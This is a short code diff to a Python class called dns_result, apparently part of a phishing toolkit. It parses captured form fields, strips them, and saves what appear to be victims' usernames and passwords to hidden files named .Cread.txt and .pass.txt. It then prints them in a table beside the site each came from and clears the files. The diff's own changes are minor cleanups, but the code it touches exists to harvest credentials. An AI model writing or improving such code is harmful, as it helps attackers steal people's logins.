@@ -99,13 +99,14 @@ class dns_result:
                             line_cread_2 = unquote(match.group(2))
 
                     if 'line_cread_1' in locals() and 'line_cread_2' in locals():
+                        line_cread_1=line_cread_1.strip()
+                        line_cread_2=line_cread_2.strip()
                         with open(Path_St + '/ServerLog/.Cread.txt', 'a') as Cread_User, \
                                 open(Path_St + '/ServerLog/.pass.txt', 'a') as cartpass:
                             count += 1
-                            Cread_User.write(line_cread_1 + '\n')
+                            Cread_User.write(line_cread_1+ '\n')
                             cartpass.write(line_cread_2 + '\n')
-                        del line_cread_1
-                        del line_cread_2
+                        del line_cread_1, line_cread_2
                 except IndexError:
                     pass
                 except UnboundLocalError:
@@ -140,11 +141,11 @@ class dns_result:
                 for i in range(count):
                     print("|   " + f"{FileWeb[i].replace('\n', ''):<20}" + "|   " + f"{Cread_User[i].replace('\n', ''):<35}" + "| " + f"{cartpass[i].replace('\n', ''):<35}" + "   |")
             with open(Path_St + '/ServerLog/.Cread.txt', 'w') as Cread_User, \
-                    open(Path_St + '/ServerLog/.pass.txt', 'w') as cartpass, \
-                    open(Path_St + '/ServerLog/.web.txt', 'w') as FileWeb:
+                open(Path_St + '/ServerLog/.pass.txt', 'w') as cartpass, \
+                open(Path_St + '/ServerLog/.web.txt', 'w') as FileWeb:
                 pass
         except IndexError:
-            pass
+           pass
 
 if __name__ == '__main__':
     dns_result()
